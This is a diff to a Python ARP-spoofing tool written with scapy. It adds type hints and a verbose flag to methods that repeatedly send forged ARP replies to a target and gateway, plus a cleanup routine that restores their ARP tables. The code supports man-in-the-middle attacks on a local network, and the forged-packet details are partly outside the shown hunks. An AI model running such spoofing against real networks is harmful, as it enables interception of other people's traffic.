@@ -1,7 +1,6 @@
 import scapy.all as scapy
 from cSubprocess import *
 from networking import *
-from exporting import *;
 import time 
 
 class ArpSpoofer:
@@ -13,18 +12,18 @@ class ArpSpoofer:
         pass
 
     # Method to remove an IP address from our own ARP cache
-    def rm_address_arp_cache(self, ip_address):
+    def rm_address_arp_cache(self, ip_address: str):
         command = 'arp -d ' + ip_address
         clean_subprocess(command, -1)
 
     # Method to create Ethernet routing frames
-    def create_ether_packets(self, target_mac, gateway_mac):
+    def create_ether_packets(self, target_mac: str, gateway_mac: str):
         # Create target / gateway routing packets
         self.target_ethernet = scapy.Ether(dst=target_mac)
         self.gateway_ethernet = scapy.Ether(dst=gateway_mac)
     
     # Method to restore ARP tables of all devices
-    def cleanup(self, gateway_ip, target_ip):
+    def cleanup(self, gateway_ip: str, target_ip: str, verbose: bool = False):
         print(" cleaning up and exiting arpspoof...\n")
 
         target_mac = get_mac_address(target_ip)
@@ -39,15 +38,17 @@ class ArpSpoofer:
         gateway_packet = self.gateway_ethernet / gateway_arp
 
         # Show the packets
-        print(target_packet.show())
-        print(gateway_packet.show())
+        if verbose is True:
+            print(target_packet.show())
+            print(gateway_packet.show())
 
         # Send the packets to target / gateway
         scapy.sendp(target_packet, iface="eth0")
         scapy.sendp(gateway_packet, iface="eth0")
 
+    # Input: gateway_ip, target_ip, and a verbos boolean that specifies verbosity
     # Method to spoof ARP tables for target and gateway devices
-    def spoof(self, gateway_ip, target_ip):
+    def spoof(self, gateway_ip: str, target_ip: str, verbose: bool = False):
         try:
             while True:
                 target_mac = get_mac_address(target_ip)
@@ -62,9 +63,10 @@ class ArpSpoofer:
                 target_packet = self.target_ethernet / target_arp
                 gateway_packet = self.gateway_ethernet / gateway_arp
 
-                # Show the packets
-                print(target_packet.show())
-                print(gateway_packet.show())
+                # If verbose is true, then show packets on route
+                if verbose is True:
+                    print(target_packet.show())
+                    print(gateway_packet.show())
 
                 # Send the spoofed arp reply packets to target / gateway
                 scapy.sendp(target_packet, iface="eth0")
